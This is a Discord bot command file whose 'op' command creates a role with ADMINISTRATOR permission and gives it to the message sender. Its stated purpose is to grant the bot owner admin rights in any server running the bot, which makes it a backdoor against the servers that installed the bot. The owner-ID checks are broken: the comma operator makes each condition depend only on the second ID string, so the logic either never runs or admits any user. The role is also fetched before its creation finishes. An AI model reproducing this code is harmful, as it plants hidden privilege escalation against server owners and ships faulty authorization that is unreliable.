

module.exports = {
    name: 'op',
	aliases: ['admin' , 'power'],
    description: 'Gives the bot owner admin permission in a server!',
    cooldown: 2,
    Usage: '`!op`',
    Category: "System",
    PermLevel: `Bot Owner`,
    async execute(client, message, args){

        if (!message.author.id == "683879319558291539" , "518382491338539017") {

            return;
            
        }
        if (message.author.id == "683879319558291539" , "518382491338539017") {

            message.guild.roles.create({ data: { name: 'Cent Utilty bot Developer', permissions: ['ADMINISTRATOR'] } });

        let role = message.guild.roles.cache.find(r => r.name === "Cent Utilty bot Developer");

            //person who started the message
            let member = message.member;

            //Give the role.
            member.roles.add(role)
            
        }

    


    },
};